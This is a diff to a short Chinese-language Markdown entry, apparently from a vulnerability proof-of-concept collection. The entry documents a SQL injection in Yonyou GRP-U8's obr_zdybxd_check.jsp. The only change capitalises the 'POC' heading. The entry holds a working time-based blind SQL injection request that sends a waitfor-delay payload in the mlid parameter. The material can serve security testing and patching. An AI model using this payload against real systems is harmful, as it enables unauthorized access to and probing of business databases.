@@ -1,6 +1,6 @@
 ## 用友GRP-U8-obr_zdybxd_check.jsp存在SQL注入
 
-## poc
+## POC
 ```
 GET /u8qx/obr_zdybxd_check.jsp?mlid=1';waitfor+delay+'0:0:3'-- HTTP/1.1
 Host: 172.16.135.132:8009
